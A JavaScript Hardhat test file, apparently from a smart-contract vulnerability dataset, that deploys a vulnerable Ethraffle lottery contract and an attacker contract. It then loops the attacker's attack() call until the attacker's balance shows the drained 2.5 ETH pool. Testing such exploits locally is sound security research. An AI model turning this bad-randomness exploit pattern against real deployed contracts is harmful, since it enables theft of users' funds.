const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack bad_randomness/etheraffle.sol", function () {
  async function deployContracts() {
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/bad_randomness/etheraffle.sol/Ethraffle_v4b.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const Ethraffle_v4b = await ethers.getContractFactory(
      json.abi,
      json.bytecode,
    );
    const victim = await Ethraffle_v4b.deploy();
    await victim.waitForDeployment();

    const EthraffleV4bAttacker = await ethers.getContractFactory(
      "contracts/bad_randomness/etheraffle_attack.sol:EthraffleV4bAttacker",
    );
    const attacker = await EthraffleV4bAttacker.deploy(victim.target);
    await attacker.waitForDeployment();

    return { victim, attacker };
  }

  it("functional check: bad_randomness/etheraffle.sol", async function () {
    const { victim } = await loadFixture(deployContracts);
    const [v, a] = await ethers.getSigners();
    await expect(
      victim.connect(a).buyTickets({ value: ethers.parseEther("0.0506") }),
    ).to.not.be.reverted;
    expect(await ethers.provider.getBalance(victim)).to.be.equal(
      ethers.parseEther("0.0506"),
    );
  });

  it("exploit bad randomness vulnerability", async function () {
    const { victim, attacker } = await loadFixture(deployContracts);

    const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceBefore).to.equal(0);

    const attackerBalanceBefore = await ethers.provider.getBalance(
      attacker.target,
    );
    expect(attackerBalanceBefore).to.equal(0);

    const [v, a] = await ethers.getSigners();
    const amount = ethers.parseEther("2.48");
    await v.sendTransaction({
      to: victim.target,
      value: amount,
    });

    await attacker.setContestants(v.address);

    const attackerAmount = ethers.parseEther("0.0506");
    await a.sendTransaction({
      to: attacker.target,
      value: attackerAmount,
    });

    let attackerBalanceAfter = 0;

    while (attackerBalanceAfter <= attackerAmount) {
      await attacker.attack();
      attackerBalanceAfter = await ethers.provider.getBalance(attacker.target);
    }

    expect(attackerBalanceAfter).to.be.equal(ethers.parseEther("2.5"));
  });
});
